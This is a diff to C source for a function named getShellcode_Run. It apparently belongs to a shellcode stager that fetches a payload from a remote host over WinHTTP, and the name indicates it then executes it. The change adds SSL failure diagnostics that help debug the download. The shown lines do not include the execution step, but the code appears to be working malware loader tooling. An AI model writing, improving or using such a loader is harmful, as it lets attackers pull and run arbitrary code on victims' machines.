@@ -322,7 +322,7 @@ void getShellcode_Run(char* host, char* port, char* resource) {
     BOOL bResults = FALSE;
     DWORD dwSize = 0, dwDownloaded = 0;
     LPSTR pszOutBuffer = NULL;
-    DWORD tlsFlags = 0, flags = 0, disableFeature = 0;
+    DWORD tlsFlags = 0, flags = 0, disableFeature = 0, sslError = 0, sslErrorSize = 0;
 
     wchar_t wHost[100], wResource[100];
     MultiByteToWideChar(CP_ACP, 0, host, -1, wHost, 100);
@@ -376,15 +376,24 @@ void getShellcode_Run(char* host, char* port, char* resource) {
         goto cleanup;
     }
 
-    // Send the request
     bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
     if (!bResults) {
         char msg[256];
         sprintf_s(msg, "WinHttpSendRequest failed with error: %ld\n", GetLastError());
         OutputDebugStringA(msg);
+
+        // Query specific SSL failure flags
+        sslError = 0;
+        sslErrorSize = sizeof(sslError);
+        if (WinHttpQueryOption(hRequest, WINHTTP_OPTION_SECURITY_FAILURE, &sslError, &sslErrorSize)) {
+            sprintf_s(msg, "SSL failure flags: %ld\n", sslError);
+            OutputDebugStringA(msg);
+        } else {
+            sprintf_s(msg, "WinHttpQueryOption (SSL failure) failed with error: %ld\n", GetLastError());
+            OutputDebugStringA(msg);
+        }
         goto cleanup;
     }
-
     bResults = WinHttpReceiveResponse(hRequest, NULL);
     if (!bResults) {
         char msg[256];
